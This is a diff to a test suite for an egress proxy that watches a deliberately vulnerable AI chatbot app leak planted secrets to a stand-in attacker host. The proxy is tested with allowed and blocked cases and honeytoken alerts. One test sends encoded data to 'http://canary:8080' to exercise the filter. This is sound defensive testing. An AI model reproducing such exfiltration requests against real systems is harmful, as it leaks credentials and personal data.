@@ -11,6 +11,7 @@ import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
+import { createHash } from 'node:crypto';
 
 const HERE = path.dirname(fileURLToPath(import.meta.url));
 const COMPOSE = path.join(HERE, '..', 'compose.egress.yml');
@@ -42,6 +43,9 @@ const dc = (args, env = {}, input) => execFileSync('docker', ['compose', '-p', P
 });
 const records = () => (fs.existsSync(LOG) ? fs.readFileSync(LOG, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)) : []);
 const canaryHits = () => dc(['logs', '--no-log-prefix', 'canary']).split('\n').filter((l) => l.includes('CANARY_HIT')).map((l) => JSON.parse(l));
+// Non-allowlisted hosts are logged as hash + length only (never by name): match the canary by its hash.
+const CANARY_SHA = createHash('sha256').update('canary').digest('hex').slice(0, 16);
+const isCanary = (x) => x.host === 'canary' || x.host_sha256 === CANARY_SHA;
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
 /** /24 prefixes (e.g. "10.232.17") already used by any docker network on this host. */
@@ -134,7 +138,7 @@ test('observe: RAGBot 7005 exfil LANDS at the attacker server and is ALERTed (fo
   const hits = hitsFor('obs1');
   assert.equal(hits.length, 1, 'attacker received exactly one exfil request');
   assert.match(hits[0].url, /dvaa-admin-secret/);
-  const r = records().find((x) => x.host === 'canary');
+  const r = records().find(isCanary);
   assert.equal(r.action, 'forward');
   assert.ok(r.reasons.includes('destination_not_allowlisted') && r.reasons.includes('honeytoken_match'), `reasons=${r.reasons}`);
   assert.equal(r.alert.PatternDispositionDescription, 'Allowed');
@@ -157,7 +161,7 @@ test('block: RAGBot 7005 exfil is PREVENTED (attacker receives nothing) although
   assert.equal(hitsFor('blk1').length, 0, 'ground truth: nothing landed');
   assert.equal(dvaa.exfilExecuted, true, 'DVAA ground truth overstates success (scoring must use receipt)');
   assert.equal(dvaa.exfilResult?.statusCode, 403);
-  const r = records().find((x) => x.host === 'canary');
+  const r = records().find(isCanary);
   assert.equal(r.action, 'deny');
   assert.ok(r.reasons.includes('honeytoken_match'));
   assert.equal(r.alert.DetectName, 'HoneytokenExfiltrationAttempt');
@@ -215,7 +219,7 @@ test('block + canary allowlisted: only the honeytoken decides (12 KiB body, 300 
   assert.equal(sendFromDvaa(`http://canary:8080/pct?d=${enc}`), '403');
   await sleep(300);
   for (const m of ['tail8k', 'rows287', 'pct']) assert.equal(hitsFor(m).length, 0, `${m} must not land`);
-  const denies = records().filter((x) => x.action === 'deny' && x.host === 'canary');
+  const denies = records().filter((x) => x.action === 'deny' && isCanary(x));
   assert.deepEqual(denies.map((d) => d.canary_ids[0]), ['DVAA-ADMIN-PASSWORD', 'DVAA-SSN-JANE', 'DVAA-OPENAI-KEY']);
   // canary allowlisted: the honeytoken (not the destination) is what decided each deny
   assert.ok(denies.every((d) => d.reasons.includes('honeytoken_match') && !d.reasons.includes('destination_not_allowlisted')), JSON.stringify(denies.map((d) => d.reasons)));
